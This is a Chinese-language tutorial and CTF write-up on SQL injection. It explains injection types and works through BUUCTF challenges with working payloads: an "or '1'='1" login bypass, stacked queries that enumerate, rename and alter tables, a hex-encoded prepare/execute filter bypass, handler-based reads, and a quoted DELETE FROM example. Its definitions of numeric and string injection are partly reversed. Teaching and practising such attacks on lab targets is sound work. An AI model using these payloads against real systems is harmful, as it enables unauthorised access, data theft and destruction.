<a name="vKdJg"></a>
# 深入了解SQL注入
<a name="PkjbR"></a>
## **什么是SQL注入？**
SQL注入即是指[web应用程序](https://baike.baidu.com/item/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/2498090?fromModule=lemma_inlink)对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的[SQL语句](https://baike.baidu.com/item/SQL%E8%AF%AD%E5%8F%A5/5714895?fromModule=lemma_inlink)，在管理员不知情的情况下实现非法操作，以此来实现欺骗[数据库服务器](https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8/613818?fromModule=lemma_inlink)执行非授权的任意查询，从而进一步得到相应的数据信息。（百度百科）<br />SQL注入是Web安全常见的一种攻击手段，其主要存在于数据库中，用来窃取重要信息，在输入框、搜索框、登录窗口、交互式等等都存在注入可能；是否是输入函数无法判断其输入的合法性并将其作为PHP等语言代码来执行，或整体逻辑出现缺陷，或关键字关键命令关键字符没过滤全，包括编码加密命令是否进行了过滤，这些种种环节的防护不严都将导致SQL注入的成功。（本人拙见）
<a name="gcNHY"></a>
### SQL注入按照注入点类型来分可以分为常见的三大类：

1. 数字型注入：当输入的参数为整型的时候，如果存在注入漏洞，则可以认为是数字型注入。

`select * from BaiMao where id='1'`

2. 字符型注入：和数字型恰恰相反，当输入的参数为字符串的时候，如果存在注入漏洞，则可以认为是字符型注入，不同的一点是，数字型注入参数需要闭合，而字符型注入参数不需要闭合。

`select * from BaiMao where id=' 1' '`

3. 搜索型注入：网站具有搜索功能，但开发人员忽略了对变量、关键字、命令的过滤，从而导致了注入可能，也可以称为文本框注入。
<a name="nULIB"></a>
### 常见注入手法分类：
> 基于从服务器接收到的响应
> 	基于报错的SQL注入
> 	联合查询注入
> 	堆查询注入
> SQL盲注
> 	基于布尔SQL盲注
> 	基于时间SQL盲注
> 	基于报错SQL盲注
> 基于程度和顺序的注入
> 	一阶注入
> 	二阶注入
> 	一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；二阶注入类似存
> 储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间
> 接的对 WEB 产生危害，这样的就被称为是二阶注入.
> 基于注入点的位置
> 	通关用户输入的单表域注射
> 	通过cookie注射
> 	通关服务器变量注射（基于头部信息的注入）
> 此处参考博客：https://blog.csdn.net/m0_46571665/article/details/124946824?spm=1001.2014.3001.5506

<a name="MP7o6"></a>
## 万能密码实验原理
用户进行登陆验证的时候，就会对其用户名和密码参数进行验证，而验证的过程就是网站需要查询数据库，而查询数据库的本质就是后台要执行SQL语句。<br />咱们可以测试一下，原来后台执行的数据库查询操作（SQL语句）：<br />`select username,password from BaiMao where username='用户名' and password='密码'`<br />由于网站后台在进行数据库查询的时候没有对单引号进行过滤，或者说是过滤不严，当输入用户名【admin】和万能密码【1' or '1'='1】的时候，执行的SQL语句为：<br />`select username,password from BaiMao where username='admin' and password=' 1' or '1'='1 '`<br />再者SQL语句中逻辑运算符具有优先级，【=】>【and】>【or】,且适用传递性，因此这个SQL语句在后台进行解析时，分成了两句，（【注意】1'时字符型注入，所以可以只看这 or '1'='1)<br />`select username,password from BaiMao where username='admin' and password=' 1 '`和【' 1 '】，两句bool（布尔类型）值进行逻辑or运算，恒为true,SQL查询语句的结果就为true，这就意味着认证成功，成功登录到系统当中。
<a name="Gizf0"></a>
### 【例题：】buuctf [极客大挑战 2019]EasySQL 1
网页环境<br />![image.png](https://img-blog.csdnimg.cn/img_convert/314d33fcf62f27cd114899e967968ee0.png)<br />可以看到是一个登录窗口，题目已经说了是SQL注入<br />首先试一下弱口令，admin,123<br />![image.png](https://img-blog.csdnimg.cn/img_convert/c38e6ae0e8ad54ea694ef49c4f34dcca.png)<br />提示用户名密码错了<br />既然是第一道题，那应该是很简单了<br />判断是数字型还是字符型

1. 数字型

`and 1=1 回显正常`<br />`and 1=2 返回异常，存在数字型注入可能`

2. 字符型

`1 返回正常`<br />`1' 返回异常，存在字符型注入可能`<br />经过测试，发现username和password两个参数都可以分别注入和同时注入<br />构造payload<br />`url?usename=1'&password=1'`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/7d0767444f2b823b4b8c07b0842ee0fc.png)<br />回显报错，存在SQL字符型注入<br />**小试一下万能密码注入**<br />构造payload<br />`url?usename=1' or '1'='1&password=1' or '1'='1`<br />**回显flag**<br />![image.png](https://img-blog.csdnimg.cn/img_convert/96a05c2bed4b5c56ada42435312f2915.png)<br />![](https://img-blog.csdnimg.cn/img_convert/89b6bbcff21af785dca29bef90aee7d0.jpeg)
<a name="W7krD"></a>
## 字符型注入和堆叠查询手法原理
**堆叠注入原理**
> 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。
> 参考：https://blog.csdn.net/qq_26406447/article/details/90643951

<a name="WKK4H"></a>
### 【例题】buuctf[强网杯 2019]随便注 1
<a name="evxPg"></a>
#### **第一种解法 堆叠注入**
网页环境<br />![image.png](https://img-blog.csdnimg.cn/img_convert/434cfacea88d014f556ac56fdbb36d36.png)<br />判断是否是字符型注入<br />`1'`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/2e8bc28f595dbd11974934fa20cfa369.png)<br />判断是否存在关键字过滤<br />`select`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/2c4f19b88e0523022badbf2d4d7d92ec.png)<br />联合查询被过滤，只能用堆叠注入了<br />查看有几个字段<br />`1' order by 2#`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/e3ca73027a6fe25e7ae0afa4bda848c9.png)<br />正常回显<br />`1' order by 3#`![image.png](https://img-blog.csdnimg.cn/img_convert/895055b725e189d42fe79ffc45702f31.png)<br />回显报错，可以看出只有两个字段<br />查看所有数据库<br />`1'; show databases;`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/823d4fa00155a99b585dde3cf3cef82e.png)<br />查看所有数据表<br />`1'; show tables;`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/b56eead234c1e36df2c5049451dec8a1.png)<br />爆words数据表的字段<br />`1';show columns from words;#`![image.png](https://img-blog.csdnimg.cn/img_convert/72352caabc7e406ed88ce07fb607b3c5.png)<br />爆1919810931114514数据表字段（注意数据表为数字的时候需要用反引号括起来）<br />`1';show columns from `1919810931114514`;#`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/014d47d3f850c8e809957090e00fb188.png)<br />可以看到这两个表words表有两个字段，而另一个只有一个字段<br />后台SQL查询语句应该是：<br />`select * from words where id=`<br />所以说只能先查询id字段，然而另一个表只有一个flag字段是肯定爆不了flag的，并且类型为varchar字符串类型，而恰巧words数据表里面的data也是varchar类型，因此从这里就可以得到做题思路，通过rename函数进行改表，把`1919810931114514`改为words，增加新字段id，将flag改为data，将刚开始那个words表改为其他任意表。<br />构造payload：<br />`1';rename table words to BaiMao;rename table `1919810931114514` to words;alter table words add id int unsigned not NULL auto_increment primary key;alter table words change flag data varchar(100);#`
> rename修改表名
> alter修改已知的列
> add增加
> int整数类型
> unsigned无符号类型
> **not null**- 指示某列不能存储 NULL 值。
> **primary key** - NOT NULL 和 UNIQUE 的结合。指定主键，确保某列（或多个列的结合）有唯一标识，每个表有且只有一个主键。
> **auto_increment**-自动赋值，默认从1开始。

成功回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/8122d53a32c6179d396ce793725a8a9c.png)<br />注意没有回显flag，就类似于你更新了个东西但是没刷新，重新在文本框里面输入1提交即可回显flag。
<a name="z4q8F"></a>
#### 第二种解法 编码逃逸 绕过滤
由于select被过滤，考虑使用编码进行绕过<br />使用select查询就很简单了<br />构造payload<br />`select *from where `1919810931114514`` <br />*号查询数据表里面的全部内容，这就是爆出flag的原理<br />进行16进制编码加密<br />`73656c656374202a2066726f6d206020313931393831303933313131343531342060`<br />最终payload：<br />`1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#`
> - prepare…from…是预处理语句，会进行编码转换。
> - execute用来执行由SQLPrepare创建的SQL语句。
> - SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
> 
参考：https://blog.csdn.net/qq_44657899/article/details/10323914

回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/d9511654ed16ddd5152c6598b5fecbde.png)
<a name="E2zV0"></a>
#### 第三种解法 handler代替select
select命令被过滤了怎么办？我们还可以用handler命令进行查看，handler命令可以一行一行的显示数据表中的内容。<br />构造payload：<br />`1'; handler `1919810931114514` open as `a`; handler `a` read next;#`
> handler代替select，以一行一行显示内容
> open打开表
> as更改表的别名为a
> read next读取数据文件内的数据次数

上传payload，回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/1aa5220a282ceac998065c80dc38af21.png)
